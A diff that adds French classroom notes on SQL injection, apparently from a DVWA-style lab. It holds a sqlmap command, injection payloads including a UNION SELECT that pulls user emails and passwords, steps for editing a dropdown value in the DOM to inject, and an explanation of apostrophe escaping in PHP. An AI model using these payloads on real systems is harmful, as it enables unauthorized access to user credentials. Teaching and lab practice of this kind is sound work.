@@ -104,3 +104,75 @@ nouvelle adresse internet
 
 <https://8015-176-161-114-130.ngrok-free.app>
 
+
+sqlmap -r 02-burp.txt -p password
+
+
+SELECT id, email, first_name, last_name, password FROM users WHERE email='a' OR 1 UNION SELECT id, email, first_name, last_name, password FROM users  --
+
+a' OR 1 --
+
+# injection medium
+
+cliquer droit > inspecter > sélectionner la balise <select> la balise du menu déroulant
+
+modifier directement dans le DOM l'attribut value de l'<option>
+
+
+<option value="1">1</option>
+
+<option value="' OR 1 --">' OR 1 --</option>
+
+Voici la solution : 
+
+<option value="1 OR 1 --">1 OR 1 --</option>
+
+SELECT * FROM table WHERE id = '1'
+
+échappement des paramètres d'une requête SQL 
+
+# Echappement 
+
+- essentiel de comprendre ce concept pour la sécurité 
+
+ 
+- le symbole apostrophe est un caractère qui a PLUSIEURS sens
+- en français : l'école
+- en informatique : créer une variable qui stocker du texte
+
+```php
+// créer une variable qui s'appelle $prenom
+// et cette variable contient la valeur Alain qui est entouré de ''
+// chaine de caractères
+$prenom = 'Alain2' ;
+$prix = '20 euros' ; 
+
+$citation = 'Victor Hugo a dit j\'ai faim ! '; 
+$citation = "Victor Hugo a dit j\"ai faim ! "; 
+
+// pour faire comprendre à programme que l'apostrophe entre j et ai est vraiment le caractère qui va lier les deux mots ET ce n'est pas la fin du texte
+
+// on ajoute, juste avant l'apostrophe, le symbole \ pour signifier à PHP que l'apostrophe EST vraiment un caractère de liaison
+
+
+SELECT * FROM users WHERE id = '1'
+SELECT * FROM users WHERE id = '1\''
+
+```
+
+-  
+- toto' OR 1 --
+- toto\' OR 1 --
+
+
+```txt
+Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'
+```
+
+Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'
+
+toto' OR 1 --
+
+1 OR 1 --
+1' OR 1 --
+1\' OR 1 --
